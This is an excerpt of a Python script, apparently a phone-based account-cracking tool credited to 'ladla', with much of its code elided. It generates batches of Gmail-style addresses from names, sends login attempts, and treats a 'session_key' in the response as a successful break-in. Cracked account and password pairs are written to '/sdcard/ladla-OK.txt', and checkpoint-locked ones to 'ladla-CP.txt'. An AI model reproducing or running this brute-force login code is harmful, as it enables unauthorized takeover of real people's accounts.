...
{uu}  ██   ██ ██   ██  ███ ███ 
\033[1;93m=================================
\033[1;97m Owner  : ladla :/
\033[1;97m GitHub : Ladla564 :/
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Ladla564/FILE')
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.ladla','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.ladla','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.ladla', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/ladla-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mladla-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/ladla-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mladla-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/ladla-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
